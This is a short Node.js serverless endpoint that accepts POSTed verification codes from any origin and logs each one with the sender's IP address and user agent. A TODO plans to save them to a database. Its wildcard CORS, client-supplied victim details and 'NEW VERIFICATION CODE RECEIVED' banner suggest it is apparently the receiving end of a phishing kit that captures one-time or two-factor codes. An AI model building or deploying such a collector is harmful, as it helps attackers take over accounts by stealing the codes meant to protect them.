const cors = require('cors');

const corsMiddleware = cors({ origin: '*' });

module.exports = async (req, res) => {
  corsMiddleware(req, res, async () => {
    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    if (req.method !== 'POST') {
      return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
      const timestamp = new Date().toISOString();
      const codeData = {
        ...req.body,
        receivedAt: timestamp
      };

      console.log('🔥 NEW VERIFICATION CODE RECEIVED:');
      console.log('Code:', codeData.verification_code);
      console.log('Time:', timestamp);
      console.log('IP:', codeData.ip_address);
      console.log('User Agent:', codeData.user_agent);
      console.log('-----------------------------------');

      // TODO: Save to database (MongoDB, PostgreSQL, etc.)
      // Example: await db.codes.insert(codeData);

      res.status(200).json({ success: true, message: 'Code received' });
    } catch (error) {
      console.error('Error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });
};
